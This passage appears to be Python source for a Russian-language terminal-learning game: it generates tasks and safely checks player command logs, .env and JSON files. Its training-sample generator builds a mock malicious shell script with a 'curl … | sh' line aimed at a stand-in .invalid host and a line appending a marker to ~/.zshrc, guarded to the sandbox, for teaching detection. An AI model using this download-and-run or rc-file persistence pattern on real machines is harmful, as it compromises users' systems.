"""Генераторы и помощники трека «Окружение и скрипты» (часть 7).

Данные одинаковы во всех темах и случайны по зерну; ловушки гарантированы построением, а не
удачей зерна (tests/test_envkit.py — 200 зёрен, tools/lint_tasks.py --seeds — больше).

Здесь же — то, чем проверки читают сделанное игроком, не исполняя его кода:
- журнал команд: segments() режет строку на простые команды (вне кавычек), lead() отделяет
  присваивания ИМЯ=значение от команды, shell_vars() — какие переменные остались в оболочке;
- файлы песочницы: box_file() — только обычный файл внутри песочницы, без симлинков и FIFO,
  с пределом размера (правило 7 уроков 9а/9б); разбор — линейный;
- .env: parse_dotenv() — пары ИМЯ=значение и промахи формы (пробел вокруг =)."""
import os
import re
import shlex
import stat
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Tuple

from termit_app.tasks import kit

READ_CAP = 4 * 1024 * 1024      # файл игрока больше 4 МБ — точно не то, что просили
TEXT_CAP = 64 * 1024            # короткие файлы урока: .env, .gitignore, отчёт в строку

# --- журнал команд ----------------------------------------------------------------------------

_SEPARATORS = (";", "&", "|", "\n", "(", ")", "`")
# служебные слова перед командой: «{ a; b; }», «if a; then b; fi», «exec b», «! a»
_PREFIX_WORDS = frozenset({"{", "}", "!", "then", "do", "else", "elif", "if", "while", "until",
                           "time", "exec", "command", "builtin", "nohup", "noglob"})


def chain(line: str) -> List[Tuple[str, str]]:
    """Простые команды строки с оператором после каждой: [(команда, оператор)], оператор —
    «&&», «||», «;», «|», «&», «\\n», скобка, «$(», «`» или «» в конце строки. Разрез — вне
    кавычек '…' и "…" (обратный слеш учитывается); 2>&1 и >&2 — перенаправления. Разбор
    линейный: один проход по строке."""
    out: List[Tuple[str, str]] = []
    cur: List[str] = []
    quote, i, n = None, 0, len(line)

    def cut(op: str) -> None:
        piece = "".join(cur).strip()
        if piece:
            out.append((piece, op))
        cur.clear()
    while i < n:
        ch = line[i]
        if quote:
            cur.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < n:
                cur.append(line[i + 1])
                i += 1
            elif ch == quote:
                quote = None
        elif ch == "\\" and i + 1 < n:
            cur.append(ch)
            cur.append(line[i + 1])
            i += 1
        elif ch in "'\"":
            quote = ch
            cur.append(ch)
        elif ch == "&" and cur and cur[-1] in "<>":
            cur.append(ch)                  # 2>&1, >&2 — перенаправление, не разделитель
        elif ch in "&|" and i + 1 < n and line[i + 1] == ch:
            cut(ch * 2)
            i += 1
        elif ch == "$" and i + 1 < n and line[i + 1] == "(":
            cut("$(")
            i += 1
        elif ch in _SEPARATORS:
            cut(ch)
        else:
            cur.append(ch)
        i += 1
    cut("")
    return out


def segments(line: str) -> List[str]:
    """Простые команды строки (chain без операторов)."""
    return [seg for seg, _ in chain(line)]


def words(segment: str) -> List[str]:
    """Слова простой команды, как их увидит оболочка (кавычки сняты); несбалансированные
    кавычки — по пробелам."""
    if not any(c in segment for c in "'\"\\$~"):
        return segment.split()              # без кавычек и подстановок — быстро
    try:
        return shlex.split(segment, comments=False, posix=True)
    except ValueError:
        return segment.split()


_ASSIGN = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$", re.S)


def lead(segment: str) -> Tuple[List[Tuple[str, str]], Optional[str], List[str]]:
    """(присваивания перед командой, команда или None, её аргументы)."""
    ws = words(segment)
    while ws and ws[0] in _PREFIX_WORDS:
        ws = ws[1:]
    assigns = []
    i = 0
    while i < len(ws):
        m = _ASSIGN.match(ws[i])
        if not m:
            break
        assigns.append((m.group(1), m.group(2)))
        i += 1
    if i >= len(ws):
        return assigns, None, []
    return assigns, ws[i], ws[i + 1:]


def commands(lines: Sequence[str]):
    """(присваивания, команда, аргументы) всех простых команд всех строк — по порядку."""
    for line in lines:
        for seg in segments(line):
            yield lead(seg)


_EXPORTERS = ("export", "typeset", "declare", "local", "readonly", "integer", "float")
EXPORTERS = _EXPORTERS


def assigned(lines: Sequence[str]) -> set:
    """Каким переменным игрок вообще давал значение: ИМЯ=… (голое или перед командой) и
    export/typeset ИМЯ."""
    have = set()
    for assigns, cmd, args in commands(lines):
        have |= {name for name, _ in assigns}
        if cmd in _EXPORTERS:
            have |= {a.split("=", 1)[0] for a in args if not a.startswith(("-", "+"))}
    return have


def shell_vars(lines: Sequence[str]) -> set:
    """Какие переменные игрок оставил в своей оболочке: голое ИМЯ=значение и export ИМЯ
    заводят, unset убирает; ИМЯ=значение перед командой — разово, оболочке не остаётся."""
    have = set()
    for assigns, cmd, args in commands(lines):
        if cmd is None:
            have |= {name for name, _ in assigns}
        elif cmd in _EXPORTERS:
            have |= {a.split("=", 1)[0] for a in args if not a.startswith(("-", "+"))}
        elif cmd == "unset":
            have -= {a for a in args if not a.startswith("-")}
    return have


# E24a (аудит новичка, I1/I4): что игрок делал с PATH своей оболочки. Массив path=(…) zsh
# chain режет по скобкам — его ищем по строке целиком; разбор линейный.
_PATH_ARRAY = re.compile(r"(?<![\w$])path(\+?)=\(([^()\n]*)\)")
_KEEPS_PATH = re.compile(r"\$\{?(?:PATH|path)\b")


def path_sets(lines: Sequence[str]) -> List[Tuple[str, str]]:
    """Присваивания PATH самой оболочке по порядку: [(значение, как набрано)]. Значение — со
    снятыми кавычками, $PATH в нём как есть; разовое PATH=… команда — не в счёт (оболочке не
    остаётся). path=(a $path) — как PATH=a:$path; path+=(…) — всегда с прежним."""
    out: List[Tuple[str, str]] = []
    for line in lines:
        if "PATH" not in line and "path" not in line:
            continue
        for m in _PATH_ARRAY.finditer(line):
            body = ":".join(m.group(2).split())
            out.append(("$path:" + body if m.group(1) else body, m.group(0)))
        for seg in segments(line):
            if "PATH" not in seg:
                continue
            assigns, cmd, args = lead(seg)
            if cmd is None:
                pairs = [(n, v) for n, v in assigns]
            elif cmd in _EXPORTERS:
                pairs = [tuple(a.split("=", 1)) for a in args if "=" in a]
            else:
                continue
            out += [(v, seg) for n, v in pairs if n == "PATH"]
    return out


def keeps_path(value: str) -> bool:
    """В значении есть прежний PATH: $PATH, ${PATH} или $path."""
    return bool(_KEEPS_PATH.search(value))


def path_lost(lines: Sequence[str]) -> bool:
    """Оболочка игрока осталась без системных папок: последнее присваивание без $PATH и без
    /usr/bin — PATH сломан; присваивание с $PATH и /usr/bin — починен; с одним $PATH — как
    было до него."""
    lost = False
    for value, _ in path_sets(lines):
        parts = value.split(":")
        base = "/usr/bin" in parts or "/bin" in parts
        if keeps_path(value):
            lost = lost and not base
        else:
            lost = not base
    return lost


def runs(segment: str, name: str, by_name: Optional[bool] = None) -> bool:
    """Запускает ли простая команда программу name (by_name — как в ran)."""
    _, cmd, _ = lead(segment)
    if cmd is None:
        return False
    if cmd == name:
        return by_name is not False
    return "/" in cmd and cmd.rsplit("/", 1)[1] == name and by_name is not True


def sequence(line: str, steps: Sequence[Tuple[str, str]]) -> bool:
    """Есть ли в строке подряд команды steps = [(программа, оператор после неё), …]: например
    [("build.sh", "&&"), ("deploy.sh", "||"), ("notify.sh", "")] — build && deploy || notify
    (оператор "" у последней — любой). Программы — по пути (./x); команды внутри кавычек (echo
    '…') — не команды. Линейно по числу команд строки."""
    parts = chain(line)
    k = len(steps)
    for i in range(len(parts) - k + 1):
        ok = True
        for j, (name, op) in enumerate(steps):
            seg, after = parts[i + j]
            if name not in seg or not runs(seg, name, by_name=False) or (op and after != op):
                ok = False
                break
        if ok:
            return True
    return False


def journal(box) -> List[Tuple[str, Optional[bool]]]:
    """Журнал команд с исходом (sandbox.read_cmd_status): True — строка завершилась успехом
    (все звенья последнего конвейера вернули 0), False — нет, None — исхода нет (rc.log не
    записан, прогон тестов): такое не считается провалом."""
    from termit_app import sandbox
    return sandbox.read_cmd_status(box)


def last_run(jour, name: str, mention: Optional[str] = None):
    """Последняя строка журнала, где запускали name (по имени или по пути; mention — и в ней
    есть это слово, например файл вывода): (строка, исход) или None."""
    for line, ok in reversed(jour):
        if (mention is None or mention in line) and name in line and \
                any(runs(seg, name) for seg in segments(line)):
            return line, ok
    return None


def ran(lines: Sequence[str], name: str, by_name: Optional[bool] = None) -> bool:
    """Запускал ли игрок программу name: by_name=True — по имени (поиск по PATH), False — по
    пути (./name, ~/…/name, /…/name), None — как угодно."""
    for _, cmd, _ in commands(lines):
        if cmd is None:
            continue
        if cmd == name and by_name is not False:
            return True
        if "/" in cmd and cmd.rsplit("/", 1)[1] == name and by_name is not True:
            return True
    return False


# --- файлы песочницы ---------------------------------------------------------------------------

def box_file(box, rel: str, cap: int = READ_CAP) -> Tuple[str, Optional[bytes]]:
    """Файл игрока для проверки у родителя: ("ok", байты) или вид отказа — "missing", "link"
    (симлинк, в том числе в пути), "notreg" (папка, FIFO, устройство), "big" (больше cap),
    "bad" (не прочесть). Читает sandbox.read_in_box: без симлинков, FIFO не вешает."""
    from termit_app import sandbox
    p = Path(box) / rel
    try:
        st = os.lstat(p)
    except FileNotFoundError:
        return "missing", None
    except OSError:
        return "bad", None
    if stat.S_ISLNK(st.st_mode):
        return "link", None
    if not stat.S_ISREG(st.st_mode):
        return "notreg", None
    if st.st_size > cap:
        return "big", None
    data = sandbox.read_in_box(box, rel, cap)
    if data is None:
        return "link", None         # звено пути — ссылка (read_in_box не пошёл по ней)
    return "ok", data


def box_text(box, rel: str, cap: int = READ_CAP) -> Tuple[str, Optional[str]]:
    kind, data = box_file(box, rel, cap)
    return kind, (data.decode("utf-8", errors="replace") if data is not None else None)


MSG_FILE = {
    "link": "{rel} — ссылка на другой файл, а нужен обычный файл. Убери её (rm {rel}) и "
            "создай файл заново.",
    "notreg": "{rel} — не обычный файл (папка или канал). Нужен обычный текстовый файл.",
    "big": "{rel} слишком большой — больше 4 МБ. Начни его заново: > {rel} перезапишет.",
    "bad": "{rel} не читается. Набери reset — соберу задачу заново.",
}


def file_problem(kind: str, rel: str) -> Optional[str]:
    """Отклик на враждебный файл (симлинк, FIFO, гигант); None — файл годен или его нет."""
    text = MSG_FILE.get(kind)
    return text.format(rel=rel) if text else None


def mode_of(box, rel: str) -> Optional[int]:
    """Права обычного файла (без симлинков): 0o644 и т.п.; None — не обычный файл."""
    try:
        st = os.lstat(Path(box) / rel)
    except OSError:
        return None
    return stat.S_IMODE(st.st_mode) if stat.S_ISREG(st.st_mode) else None


def executable(box, rel: str) -> bool:
    mode = mode_of(box, rel)
    return mode is not None and bool(mode & 0o100)


def first_line(text: Optional[str]) -> str:
    if not text:
        return ""
    return text.split("\n", 1)[0].strip()


# --- .env ---------------------------------------------------------------------------------------

_ENV_LINE = re.compile(r"^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
_ENV_SPACED = re.compile(r"^(?:export\s+)?[A-Za-z_][A-Za-z0-9_]*(?:\s+=|=\s)")


def parse_dotenv(text: str) -> Tuple[Dict[str, str], List[str]]:
    """Пары ИМЯ=значение файла .env и промахи формы: "space" — пробел вокруг =, "junk" —
    строка не вида ИМЯ=значение. Кавычки вокруг значения снимаются. Разбор — по строкам,
    линейный; пустые строки и # — мимо."""
    pairs: Dict[str, str] = {}
    problems: List[str] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if _ENV_SPACED.match(line):
            problems.append("space")
            continue
        m = _ENV_LINE.match(line)
        if not m:
            problems.append("junk")
            continue
        value = m.group(2).strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "'\"":
            value = value[1:-1]
        pairs[m.group(1)] = value
    return pairs, problems


GITIGNORE_ENV = (".env", "/.env", ".env*", "*.env", "/.env*")


def ignores_env(text: Optional[str]) -> bool:
    return bool(text) and any(x.strip() in GITIGNORE_ENV for x in text.splitlines())


# --- E5 env_vars: окружение задачи -----------------------------------------------------------

APP_KEYS = ("APP_REGION", "APP_MODE", "APP_PORT", "APP_USER", "APP_THEME", "APP_CACHE",
            "APP_LANG", "APP_LEVEL", "APP_HOST")
DB_KEYS = ("DB_HOST", "DB_NAME", "DB_PORT", "DB_POOL")
EXTRA_KEYS = ("WORKERS", "QUEUE_NAME", "TIMEOUT_SEC", "SVC_OWNER", "CACHE_TTL")
# переменные, у которых в ЗНАЧЕНИИ есть APP_: grep -c APP_ без ^ их тоже сочтёт
DECOY_KEYS = ("LOG_TAG", "TRACE_PREFIX", "SVC_ALIAS", "METRIC_NS")
NUMERIC = ("APP_PORT", "DB_PORT", "DB_POOL", "WORKERS", "TIMEOUT_SEC", "CACHE_TTL", "BUILD_ID")


def env_vars(rng) -> dict:
    """9–14 переменных: APP_* (с APP_REGION), DB_*, REGION, BUILD_ID, 1–3 «приманки» со
    значением APP_слово. Значения — слово-ЧИСЛО из kit.LATIN (все разные, ни одно не входит
    в другое) или число ≥ 100: короткие числа-ответы с ними не совпадают. Возвращает
    {"vars", "apps", "decoys", "needle_name"}: needle_name — переменная со словом-значением,
    его ищут в варианте C."""
    apps = ["APP_REGION"] + rng.sample(APP_KEYS[1:], rng.randint(2, 5))
    dbs = rng.sample(DB_KEYS, rng.randint(2, 3))
    decoys = rng.sample(DECOY_KEYS, rng.randint(1, 3))
    names = apps + dbs + ["REGION", "BUILD_ID"] + decoys
    spare = [k for k in EXTRA_KEYS]
    rng.shuffle(spare)
    while len(names) < 9 or (len(names) < 14 and rng.random() < 0.3):
        names.append(spare.pop())
    words = rng.sample(kit.LATIN, len(names))
    nums = rng.sample(range(10, 100), len(names))
    out = {}
    for i, name in enumerate(names):
        if name == "BUILD_ID":
            out[name] = str(rng.randint(10000, 99999))
        elif name in NUMERIC:
            out[name] = str(rng.randint(100, 9999))
        elif name in decoys:
            out[name] = "APP_" + words[i]
        else:
            out[name] = f"{words[i]}-{nums[i]}"
    wordy = sorted(k for k in names if k not in NUMERIC and k not in decoys
                   and k != "APP_REGION")
    return {"vars": out, "apps": sorted(apps), "decoys": sorted(decoys),
            "needle_name": rng.choice(wordy)}


def env_lines_text(env: Dict[str, str]) -> List[str]:
    """Строки env (ИМЯ=значение) переменных задачи — для подсчётов у родителя."""
    return [f"{k}={v}" for k, v in sorted(env.items())]


# --- E11 json_config: конфиг на JSON ------------------------------------------------------------

JSON_DEPTH = 64             # глубже — точно не конфиг задачи (правило 7: json — глубина ≤ 64)


def json_depth_ok(text: str, limit: int = JSON_DEPTH) -> bool:
    """Вложенность [ и { вне строк не глубже limit. Один проход: json.loads на 10 000
    скобках упал бы в RecursionError, а здесь — быстрый отказ."""
    depth, in_str, esc = 0, False, False
    for ch in text:
        if in_str:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
        elif ch == '"':
            in_str = True
        elif ch in "[{":
            depth += 1
            if depth > limit:
                return False
        elif ch in "]}":
            depth -= 1
    return True


def _no_constant(name):
    raise ValueError(f"не JSON: {name}")


def load_json(text: str):
    """(вид, объект): "ok" — разобран; "empty" — пусто (файл стёрт); "deep" — вложенность
    больше JSON_DEPTH; "broken" — синтаксис (NaN и Infinity — тоже: это не JSON)."""
    import json
    if not text.strip():
        return "empty", None
    if not json_depth_ok(text):
        return "deep", None
    try:
        return "ok", json.loads(text, parse_constant=_no_constant)
    except (ValueError, RecursionError):
        return "broken", None


APP_NAMES = ("orders", "billing", "gallery", "notes", "radar", "ledger", "courier", "pulse")
FEATURE_KEYS = ("dark_mode", "cache", "export", "search", "metrics", "uploads")


def _app_doc(rng) -> dict:
    hosts = [f"{w}.lan" for w in rng.sample(kit.LATIN, rng.randint(2, 4))]
    feats = {"beta": True}
    for k in rng.sample(FEATURE_KEYS, rng.randint(2, 4)):
        feats[k] = rng.random() < 0.5
    return {
        "name": rng.choice(APP_NAMES),
        "version": f"1.{rng.randint(0, 9)}.{rng.randint(0, 20)}",
        "server": {"hosts": hosts, "port": rng.choice((8080, 8000, 8443, 3000, 9000)),
                   "timeout": rng.choice((10, 15, 30, 60))},
        "db": {"host": f"db-{rng.choice(kit.LATIN)}.lan",
               "port": rng.choice((5432, 5433, 3306, 6543)),
               "name": rng.choice(kit.LATIN), "pool": rng.randint(2, 20)},
        "features": feats,
    }


_STR_VALUE = re.compile(r'^(\s*"[a-z_]+": )"([^"\\]*)"(,?)$')
_ARR_STR = re.compile(r'^(\s*)"([^"\\]*)"(,?)$')


def _break(lines: List[str], rng, kind: str) -> Tuple[List[str], int]:
    """Одна ошибка вида kind: (строки, номер изменённой строки с 1). Места есть всегда:
    у объекта есть последний элемент, запятые и текстовые значения (name, version).
    trailing — запятая после последнего элемента; quotes — одинарные кавычки вокруг
    текста; missing — пропущенная запятая между элементами."""
    n = len(lines)
    if kind == "trailing":
        cand = [i for i in range(1, n - 1) if not lines[i].endswith((",", "{", "["))
                and lines[i + 1].strip() in ("}", "},", "]", "],")]
        fix = lambda s: s + ","                                         # noqa: E731
    elif kind == "missing":
        cand = [i for i in range(1, n - 1) if lines[i].endswith(",")]
        fix = lambda s: s[:-1]                                          # noqa: E731
    else:
        cand = [i for i in range(1, n - 1)
                if _STR_VALUE.match(lines[i]) or _ARR_STR.match(lines[i])]

        def fix(s):
            m = _STR_VALUE.match(s)
            if m:
                return f"{m.group(1)}'{m.group(2)}'{m.group(3)}"
            m = _ARR_STR.match(s)
            return f"{m.group(1)}'{m.group(2)}'{m.group(3)}"
    i = rng.choice(cand)
    out = list(lines)
    out[i] = fix(lines[i])
    return out, i + 1


def app_config(rng) -> dict:
    """app.json для E11: документ (server, db, features), его текст (indent 2) и тот же текст
    с одной ошибкой синтаксиса. Плюс новые значения вариантов: port (не равен db.port) и host
    (нет среди server.hosts). Возвращает {"doc", "text", "broken", "kind", "line", "port",
    "host"}."""
    import json
    doc = _app_doc(rng)
    text = json.dumps(doc, indent=2, ensure_ascii=False) + "\n"
    lines = text.rstrip("\n").split("\n")
    kind = rng.choice(("trailing", "quotes", "missing"))
    broken, line = _break(lines, rng, kind)
    ports = (5432, 5433, 6432, 6543, 15432, 25432)
    port = rng.choice([p for p in ports if p != doc["db"]["port"]])
    hosts = doc["server"]["hosts"]
    host = rng.choice([w for w in kit.LATIN if f"{w}.lan" not in hosts]) + ".lan"
    return {"doc": doc, "text": text, "broken": "\n".join(broken) + "\n", "kind": kind,
            "line": line, "port": port, "host": host}


# --- E13/E14: скачанные скрипты и учебная «зараза» (A8) ----------------------------------------
# Тексты собираются здесь из строк при setup: в git нет ни одного исполняемого .sh «вредоноса».
# «Зараза» безвредна: сетевая строка — в функции, которую никто не зовёт (и адрес *.invalid по
# RFC 2606, и сеть закрыта профилем); исполняемая часть ставит только метку — строку
# SYNC_MARK в ~/.zshrc песочницы и пустой ~/.cache/.sync — и только внутри игры: задан
# $TERMIT_BOX, $HOME (после pwd -P) лежит в нём, есть $TERMIT_BOX/.termit/task.json. Иначе
# exit 0 без вывода. Без base64, без удаления, без фоновых процессов, без crontab/launchctl.

# метки «заразы»: у нового образца E14 (B, C) своя — grep по метке известных его не найдёт,
# нужна своя сигнатура (ревью P3, M1)
MARKS = ("# sync-agent", "# boost-agent", "# turbo-agent")
SYNC_MARK = MARKS[0]
# строка перед охраной (ревью P3, M5): понятно новичку и другу, скопировавшему файл
# E24a (аудит, мелкие): 5 строк охраны с TERMIT_BOX в head -n 10 сами выглядят подозрительно —
# строка-пояснение называет их прямо
HONEST_NOTE = ("# учебный образец termit: 5 строк с TERMIT_BOX ниже — его защита, вне игры он "
               "сразу выходит")

_GUARD = (
    '[ -n "$TERMIT_BOX" ] || exit 0',
    'box=$(cd "$TERMIT_BOX" 2>/dev/null && pwd -P) || exit 0',
    'home=$(cd "$HOME" 2>/dev/null && pwd -P) || exit 0',
    'case "$home/" in "$box"/*) ;; *) exit 0 ;; esac',
    '[ -f "$box/.termit/task.json" ] || exit 0',
)
_DIRTY_FILLER = (       # по порядку; каждый пункт — строки, которые идут вместе
    ('echo "{stem}: чищу кэш…"',),
    ('n=$(ls | wc -l)', 'echo "{stem}: файлов в папке: $n"'),
    ('echo "{stem}: проверяю настройки"',),
    ('sleep 0',),
    ('echo "{stem}: ускоряю запуск"',),
    ('date +%H:%M',),
    ('echo "{stem}: почти всё"',),
)
DIRTY_NAMES = ("speedup.sh", "fix_wifi.sh", "cleaner_pro.sh", "turbo_boot.sh", "mac_tuner.sh",
               "battery_saver.sh", "disk_doctor.sh")


def dirty_script(rng, name: str, mark: str = SYNC_MARK) -> Tuple[str, Dict[str, int]]:
    """Учебный «вредный» скрипт: (текст, {"zshrc": строка записи в ~/.zshrc, "curl": строка
    скачивания}). Обе строки — после десятой и не в самом конце: без grep или less их не
    видно. Номера строк зависят от зерна."""
    stem = name.rsplit(".", 1)[0]
    head = ["#!/bin/sh", f"# {name} — ускоряет терминал: чистит кэш и включает быстрый старт.",
            f"# Запуск: ./{name}"]
    picked = sorted(rng.sample(range(len(_DIRTY_FILLER)), 6))
    items = [[x.format(stem=stem) for x in _DIRTY_FILLER[i]] for i in picked]
    k1 = rng.randint(2, 3)                  # до первой подозрительной строки
    k2 = k1 + rng.randint(1, 2)             # между ними
    pre = [x for it in items[:k1] for x in it]
    mid = [x for it in items[k1:k2] for x in it]
    post = [x for it in items[k2:] for x in it]
    fetch = ["fetch_update() {",
             f"  curl -fsSL https://cdn.example.invalid/{stem}/agent.sh | sh",
             "}"]
    payload = ['mkdir -p "$HOME/.cache" && : > "$HOME/.cache/.sync"',
               f"echo '{mark}' >> \"$HOME/.zshrc\""]
    body = head + [HONEST_NOTE] + list(_GUARD) + pre
    if rng.random() < 0.5:
        body += fetch + mid + payload
    else:
        body += payload + mid + fetch
    body += post + [f'echo "{stem}: готово, открой новое окно терминала"']
    lines = {"zshrc": body.index(payload[1]) + 1, "curl": body.index(fetch[1]) + 1}
    return "\n".join(body) + "\n", lines


# полезные скрипты: шаблон с параметром {n} — подменённая копия отличается им
USEFUL = {
    "resize.sh": ("#!/bin/sh\n# Уменьшает фото в папке до {n} точек по длинной стороне.\n"
                  "# Запуск: ./resize.sh ПАПКА\n"
                  "[ -d \"$1\" ] || {{ echo \"нужна папка\" >&2; exit 1; }}\n"
                  "for f in \"$1\"/*.jpg; do\n  sips -Z {n} \"$f\" >/dev/null && echo \"$f\"\n"
                  "done\n"),
    "clean_tmp.sh": ("#!/bin/sh\n# Показывает временные файлы старше {n} дней — удалять решаешь "
                     "сам.\n# Запуск: ./clean_tmp.sh ПАПКА\n"
                     "find \"${{1:-.}}\" -name '*.tmp' -type f -mtime +{n} -print\n"),
    "rename.sh": ("#!/bin/sh\n# Переименовывает фото по номеру: photo_001.jpg, photo_002.jpg…\n"
                  "# Запуск: ./rename.sh ПАПКА\ni={n}\n"
                  "for f in \"$1\"/*.jpg; do\n  i=$((i + 1))\n"
                  "  mv -n \"$f\" \"$1/photo_$(printf %03d $i).jpg\"\ndone\n"),
    "count_lines.sh": ("#!/bin/sh\n# Считает строки во всех .txt папки, показывает первые {n}.\n"
                       "# Запуск: ./count_lines.sh ПАПКА\n"
                       "wc -l \"${{1:-.}}\"/*.txt | sort -rn | head -n {n}\n"),
    "backup_notes.sh": ("#!/bin/sh\n# Копирует заметки в backup/ и хранит {n} последних копий.\n"
                        "# Запуск: ./backup_notes.sh\nmkdir -p backup\n"
                        "cp notes.txt \"backup/notes-$(date +%Y%m%d%H%M).txt\"\n"
                        "ls -t backup | tail -n +$(({n} + 1))\n"),
}


def useful_script(name: str, n: int) -> str:
    """Полезный скрипт с той же шапкой, что у «заразы» (Fix2 ревью P3): комментарий «учебный
    образец» и охрана после трёх строк описания — head не отличает скрипты; здесь охрана —
    безвредный no-op: вне игры скрипт просто выходит."""
    lines = USEFUL[name].format(n=n).split("\n")
    return "\n".join(lines[:3] + [HONEST_NOTE] + list(_GUARD) + lines[3:])


def sha256_hex(data) -> str:
    import hashlib
    return hashlib.sha256(data.encode("utf-8") if isinstance(data, str) else data).hexdigest()


def downloads(rng) -> dict:
    """downloads/ для E13: 3–4 полезных скрипта и один учебный «грязный» плюс SHA256SUMS от
    автора. Один полезный подменён (его хэш не сходится); грязный с отпечатком сходится —
    постройкой это разные файлы. Возвращает {"files": {имя: текст}, "sums", "dirty",
    "tampered", "zshrc", "curl"}."""
    names = rng.sample(sorted(USEFUL), rng.randint(3, 4))      # ревью P3, M10: 4–5 файлов
    dirty = rng.choice(DIRTY_NAMES)
    files, published = {}, {}
    for name in names:
        n = rng.randint(3, 30)
        published[name] = files[name] = useful_script(name, n)
        if name == names[0]:
            tampered, n_bad = name, n + rng.randint(1, 9) * 10
    files[tampered] = useful_script(tampered, n_bad)      # подменён: другой параметр
    text, lines = dirty_script(rng, dirty)
    files[dirty] = published[dirty] = text
    sums = "".join(f"{sha256_hex(published[k])}  {k}\n" for k in sorted(published))
    return {"files": files, "sums": sums, "dirty": dirty, "tampered": tampered,
            "zshrc": lines["zshrc"], "curl": lines["curl"]}


# --- E14 av_scan: почта с вложениями и старая база --------------------------------------------

INBOX_DIRS = ("mail", "usb", "chat", "share", "old")
NOTE_NAMES = ("notes.txt", "todo.txt", "invoice.txt", "readme.txt", "plan.txt")
PHOTO_NAMES = ("cat.jpg", "beach.jpg", "receipt.jpg", "scan.jpg")
# чистый, хоть и с curl: качает файл, а не исполняет его — «чистое не трогай»
FETCH_SH = ("#!/bin/sh\n# Забирает свежие курсы в rates.json — только скачать, ничего не "
            "запускает.\ncurl -s https://api.example.invalid/rates -o rates.json && "
            "echo \"курсы обновлены\"\n")
SIG_NAMES = ("Demo.ShellRc.A", "Demo.ShellRc.B", "Demo.ShellRc.C")
NEW_SIG = "Demo.New"
LOCAL_HSB = "# свои сигнатуры — по строке: sha256:размер:Имя\n"


def inbox(rng, variant: int) -> dict:
    """inbox/ для E14: 8–12 файлов в 3 подпапках, имена все разные. A — 2–3 «грязных», все
    известны базе; B и C — 1–2 известных и новый образец, которого в базе нет (его sha256 и
    размер — в report.txt). ~/av/main.hsb знает известных и пару посторонних образцов.
    Возвращает {"files": {путь: (байты, права)}, "dirty": [[путь, sha256, новый?]],
    "clean": {путь: sha256}, "main_hsb", "report" (или None), "sample" ({sha, sha1, size} или
    None)}."""
    import hashlib
    dirs = rng.sample(INBOX_DIRS, 3)
    n_known = rng.randint(2, 3) if variant == 0 else rng.randint(1, 2)
    names = rng.sample(DIRTY_NAMES, n_known + (variant != 0))
    files, dirty, clean = {}, [], {}

    def put(name, data, mode, bad=False, new=False):
        rel = f"inbox/{rng.choice(dirs)}/{name}"
        files[rel] = (data, mode)
        h = hashlib.sha256(data).hexdigest()
        if bad:
            dirty.append([rel, h, new])
        else:
            clean[rel] = h

    for i, name in enumerate(names):
        new = variant != 0 and i == n_known
        text, _ = dirty_script(rng, name, MARKS[1] if new else SYNC_MARK)
        put(name, text.encode("utf-8"), 0o755, bad=True, new=new)
    for name in rng.sample(sorted(USEFUL), rng.randint(1, 2)):
        put(name, useful_script(name, rng.randint(3, 30)).encode("utf-8"), 0o755)
    put("rates_fetch.sh", FETCH_SH.encode("utf-8"), 0o755)
    total = rng.randint(8, 12)
    pool = [("t", n) for n in NOTE_NAMES] + [("p", n) for n in PHOTO_NAMES]
    rng.shuffle(pool)
    for kind, name in pool[:max(0, total - len(files))]:
        if kind == "t":
            body = "\n".join(f"{rng.choice(kit.LATIN)} {rng.randint(1, 99)}"
                             for _ in range(rng.randint(2, 6))) + "\n"
            put(name, body.encode("utf-8"), 0o644)
        else:
            put(name, b"\xff\xd8\xff\xe0" + rng.randbytes(rng.randint(512, 4096)), 0o644)
    known = [d for d in dirty if not d[2]]
    lines = [f"{h}:{len(files[rel][0])}:{SIG_NAMES[i]}" for i, (rel, h, _) in enumerate(known)]
    for i in range(rng.randint(2, 3)):         # посторонние образцы: в inbox их нет
        lines.append(f"{rng.randbytes(32).hex()}:{rng.randint(200, 9000)}:Demo.Old.{i + 1}")
    rng.shuffle(lines)
    sample = report = None
    if variant != 0:
        rel = next(d[0] for d in dirty if d[2])
        data = files[rel][0]
        sample = {"sha": hashlib.sha256(data).hexdigest(), "sha1": hashlib.sha1(data).hexdigest(),
                  "size": len(data)}
        report = ("Новый образец — база его ещё не знает.\n"
                  f"sha256: {sample['sha']}\nразмер: {sample['size']} байт\n"
                  "Лежит где-то в inbox/. Не запускай.\n")
    return {"files": files, "dirty": dirty, "clean": clean,
            "main_hsb": "\n".join(lines) + "\n", "report": report, "sample": sample}


# --- E15–E17: venv и pip --------------------------------------------------------------------
# Что стоит в окружении, родитель узнаёт по именам папок dist-info (ИМЯ-ВЕРСИЯ.dist-info) —
# листинг без чтения файлов и без перехода по ссылкам, с пределом записей. Код пакетов и
# скрипты игрока не исполняются и не импортируются.

DIR_LIMIT = 2000                # записей в папке больше — это уже не окружение задачи
_PY_CMD = re.compile(r"^python(?:3(?:\.\d+)?)?$")
_DIST_INFO = re.compile(r"^([A-Za-z0-9][A-Za-z0-9._-]*)-([0-9][0-9A-Za-z.+!-]*)\.dist-info$")
_LIB_PY = re.compile(r"^python3\.\d+$")
# пакеты, что есть в любом venv (pip freeze их не печатает)
VENV_BASE = frozenset({"pip", "setuptools", "wheel", "distribute"})


def canon(name: str) -> str:
    """Имя пакета по PEP 503: регистр и -, _, . — одно и то же."""
    return re.sub(r"[-_.]+", "-", name).lower()


def dirs_in_box(box, rel: str, limit: int = DIR_LIMIT) -> Optional[List[str]]:
    """Имена папок (не ссылок) в папке песочницы; звенья пути — без ссылок. Нет папки,
    путь вне песочницы или записей больше limit — None."""
    from termit_app import sandbox
    parts = sandbox._box_parts(box, rel)
    if parts is None:
        return None
    try:
        dfd = sandbox._open_dirs(box, parts)
    except OSError:
        return None
    out, n = [], 0
    try:
        with os.scandir(dfd) as it:
            for e in it:
                n += 1
                if n > limit:
                    return None
                try:
                    if e.is_dir(follow_symlinks=False):
                        out.append(e.name)
                except OSError:
                    continue
    except OSError:
        return None
    finally:
        os.close(dfd)
    return sorted(out)


def _dists(box, site: str) -> Optional[Dict[str, str]]:
    names = dirs_in_box(box, site)
    if names is None:
        return None
    out = {}
    for n in names:
